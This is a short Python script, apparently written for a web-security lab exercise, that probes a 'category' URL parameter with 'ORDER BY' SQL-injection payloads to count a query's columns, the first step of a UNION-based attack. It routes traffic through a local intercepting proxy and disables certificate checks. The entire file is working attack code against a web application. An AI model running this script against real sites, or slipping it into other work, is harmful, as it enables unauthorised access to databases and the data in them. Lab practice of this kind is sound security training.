import requests 
import sys
import urllib3 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}



def exploit_sqli_column(url):
    path = "filter?category=Accessories"
    for i in range (1,50):
        sql_payload = "'+ORDER+BY+%s --" %i
        r = requests.get(url + path + sql_payload,verify=False,proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i -1
        i = i + 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-]usuage : %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1" ' % sys.argv[0])
        sys.exit(-1)

    print("[+] figuring out the number of columns ....")
    num_col = exploit_sqli_column(url)
    if num_col:
        print(f"[+] the number of column is {num_col}")
    else:
        print("the sqli attack was not successful")
